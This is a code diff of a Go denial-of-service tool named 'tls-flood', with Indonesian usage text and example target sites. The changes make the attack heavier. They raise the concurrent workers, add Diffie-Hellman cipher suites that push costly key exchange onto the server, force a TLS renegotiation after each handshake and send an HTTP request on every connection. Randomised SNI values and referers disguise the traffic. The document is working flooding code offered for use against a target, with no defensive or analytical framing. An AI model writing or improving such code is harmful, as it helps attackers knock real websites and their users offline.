@@ -20,35 +20,12 @@ import (
 )
 
 const (
-	wrk          = 1200
-	sub          = 4
-	dialTO       = 3 * time.Second
-	handshakeTO  = 3 * time.Second
-	httpTimeout  = 5 * time.Second
+	wrk          = 1500
+	sub          = 5
+	dialTO       = 4 * time.Second
+	handshakeTO  = 10 * time.Second
+	httpTimeout  = 10 * time.Second
 )
-
-var cipherSuitesTLS10 = []uint16{
-	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-}
-
-var cipherSuitesTLS11 = []uint16{
-	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
-	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
-}
-
-var cipherSuitesTLS12 = []uint16{
-	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-}
 
 var sniPool = []string{
 	"google.com",
@@ -101,6 +78,37 @@ var referers = []string{
 	"https://duckduckgo.com/",
 }
 
+var cipherSuitesTLS10 = []uint16{
+	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
+	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
+}
+
+var cipherSuitesTLS11 = []uint16{
+	tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_RSA_WITH_AES_256_CBC_SHA,
+	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
+}
+
+var cipherSuitesTLS12 = []uint16{
+	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+	tls.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,
+	tls.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,
+	tls.TLS_DHE_RSA_WITH_AES_128_CBC_SHA,
+	tls.TLS_DHE_RSA_WITH_AES_256_CBC_SHA,
+}
+
 func randomSNI() string {
 	return sniPool[rand.Intn(len(sniPool))]
 }
@@ -119,6 +127,7 @@ func getTLSConfig(version int) *tls.Config {
 		ServerName:         randomSNI(),
 		MinVersion:         uint16(0x0300 + version - 10),
 		MaxVersion:         uint16(0x0300 + version - 10),
+		Renegotiation:      tls.RenegotiateOnceAsClient,
 	}
 	switch version {
 	case 10:
@@ -175,7 +184,7 @@ func sendHTTPRequest(conn *tls.Conn, host string) error {
 	return err
 }
 
-func tlsHandshake(conn net.Conn, host string, sendHTTP bool) error {
+func tlsHandshake(conn net.Conn, host string) error {
 	version := 10 + rand.Intn(4)
 	cfg := getTLSConfig(version)
 	tlsConn := tls.Client(conn, cfg)
@@ -198,9 +207,26 @@ func tlsHandshake(conn net.Conn, host string, sendHTTP bool) error {
 		return err
 	}
 
-	if sendHTTP {
-		_ = sendHTTPRequest(tlsConn, host)
+	if version != 13 {
+		ctxReneg, cancelReneg := context.WithTimeout(context.Background(), handshakeTO)
+		defer cancelReneg()
+		errChReneg := make(chan error, 1)
+		go func() {
+			errChReneg <- tlsConn.Handshake()
+		}()
+		select {
+		case err = <-errChReneg:
+		case <-ctxReneg.Done():
+			tlsConn.Close()
+			return ctxReneg.Err()
+		}
+		if err != nil {
+			tlsConn.Close()
+			return err
+		}
 	}
+
+	_ = sendHTTPRequest(tlsConn, host)
 	tlsConn.Close()
 	return nil
 }
@@ -208,7 +234,7 @@ func tlsHandshake(conn net.Conn, host string, sendHTTP bool) error {
 func main() {
 	if len(os.Args) < 2 {
 		fmt.Println("cara make nya : tls-flood <target> [duration]")
-		fmt.Println("Example: tls-flood https://teamrrq.com 60")
+		fmt.Println("Detail : tls-flood https://jembotmu.com 60")
 		os.Exit(1)
 	}
 	target := os.Args[1]
@@ -250,7 +276,7 @@ func main() {
 	}
 
 	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-	fmt.Printf("ޗ | Method : TLS-FLOOD + HTTP\n")
+	fmt.Printf("ޗ | Method : TLS-FLOOD (DH+Reneg)\n")
 	fmt.Printf("ޗ | Ulimit : 1048576\n")
 	fmt.Printf("ޗ | Target : %s\n", target)
 	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
@@ -288,8 +314,7 @@ func main() {
 						if err != nil {
 							continue
 						}
-						sendHTTP := rand.Float32() < 0.7
-						_ = tlsHandshake(conn, host, sendHTTP)
+						_ = tlsHandshake(conn, host)
 					}
 				}()
 			}
